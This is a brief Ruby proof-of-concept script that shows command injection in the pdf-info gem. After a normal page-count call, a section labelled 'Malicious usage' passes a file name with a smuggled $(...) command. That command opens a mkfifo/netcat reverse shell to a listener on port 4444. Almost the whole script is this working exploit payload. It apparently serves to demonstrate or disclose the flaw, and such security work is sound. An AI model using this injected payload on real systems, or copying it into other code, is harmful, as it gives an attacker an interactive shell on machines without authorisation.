#!/usr/bin/env ruby

require 'pdf/info'


print "[+] Intended usage\n"
info = PDF::Info.new("./pdf/sample1.pdf")

print "Document has #{info.metadata[:page_count]} pages\n\n"

print "[+] Malicious usage\n"
print "[+] Open a listener on port 4444, press Enter to continue"
gets
info = PDF::Info.new("./pdf/sample1.pdf; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444>/tmp/f)")

print "Document has #{info.metadata[:page_count]} pages\n\n"